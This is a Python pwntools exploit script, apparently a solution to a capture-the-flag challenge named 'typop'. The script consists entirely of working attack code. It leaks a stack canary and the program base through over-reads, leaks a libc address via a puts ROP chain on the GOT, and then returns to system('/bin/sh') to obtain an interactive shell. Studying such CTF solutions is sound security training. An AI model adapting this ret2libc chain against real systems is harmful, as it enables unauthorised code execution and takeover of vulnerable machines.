from pwn import *
context.arch = "amd64"

gdbscript="""
c
"""
# io = remote("typop.chal.idek.team", 1337)
libc = ELF("./libc.so.6")
# io = gdb.debug("./chall", gdbscript=gdbscript)
io = process(["./chall"])
elf = ELF("./chall")
libc = io.elf.libc

# leaking canary
io.sendline(b"y")
sleep(0.5)
io.send(b"a"*11)
io.recvuntil(b"You said: ")
io.recv(11)
canary = u64(io.recv(7).rjust(8,b'\0'))
log.info(f"canary is {hex(canary)}")

# correcting the overwritten canary
payload = b"a"*10
payload += p64(canary)
payload += b"a"*8
io.send(payload)
addr = unpack(io.recvline()[:-1], "all")
log.info(f"stack address is {hex(addr)}")

# finding elf base with rip leak
io.sendline(b"y")
sleep(0.5)
payload = b"a"*26
io.send(payload)
io.recvuntil(b"You said: ")
io.recv(26)
elf_addr = unpack(io.recv(6), "all")
log.info(f"elf address is {hex(elf_addr)}")
base = elf_addr - 0x1447
elf.address = base
log.info(f"found elf base at {hex(elf.address)}")

# ret2libc - puts leak
rop = ROP(elf)
payload = b"a"*10
payload += p64(canary)
payload += b"a"*8
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.read)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.getFeedback)
sleep(0.5)
io.send(payload)
io.recvuntil(b"feedback?\n")
read_addr = unpack(io.recvline().strip(), "all")
log.info(f'read leak => {hex(read_addr)}')
libc.address = read_addr - libc.symbols.read
log.info(f'Libc base => {hex(libc.address)}')

# ret2libc - /bin/sh shell
io.sendline(b"y")
payload = b"a"*10
payload += p64(canary)
payload += b"a"*8
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh\0')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)
sleep(0.5)
pause()
io.send(payload)

io.interactive()
